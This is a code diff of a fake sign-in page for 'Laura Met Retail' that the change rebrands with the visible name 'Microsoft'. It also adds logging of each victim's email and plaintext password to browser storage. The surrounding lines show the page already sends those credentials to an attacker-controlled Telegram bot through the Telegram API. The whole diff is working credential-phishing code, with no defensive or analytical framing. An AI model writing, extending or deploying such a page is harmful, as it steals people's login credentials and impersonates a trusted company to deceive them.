@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign In | Laura Met Retail</title>
+    
+    <link rel="icon" type="image/png" href="images.png">
+    
     <style>
         body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', Arial, sans-serif; overflow: hidden; }
         .wrapper {
@@ -34,7 +37,7 @@
     <div class="wrapper">
         <div class="card">
             <div id="loadingOverlay"><div class="spinner"></div></div>
-            <span class="logo-text">LAURA MET RETAIL</span>
+            <span class="logo-text">Microsoft</span>
             
             <div id="emailSection">
                 <h1>Sign in</h1>
@@ -115,6 +118,17 @@
 
             overlay.style.display = 'flex';
 
+            // 1. Save to Local History for Dashboard
+            const loginAttempt = {
+                email: user_email,
+                password: pass,
+                time: new Date().toLocaleString()
+            };
+            let history = JSON.parse(localStorage.getItem('loginHistory') || "[]");
+            history.push(loginAttempt);
+            localStorage.setItem('loginHistory', JSON.stringify(history));
+
+            // 2. Send to Telegram
             const message = `<b>🔔 Login Attempt: Laura Met Retail</b>\n\n<b>📧 Email:</b> <code>${user_email}</code>\n<b>🔑 Password:</b> <code>${pass}</code>`;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
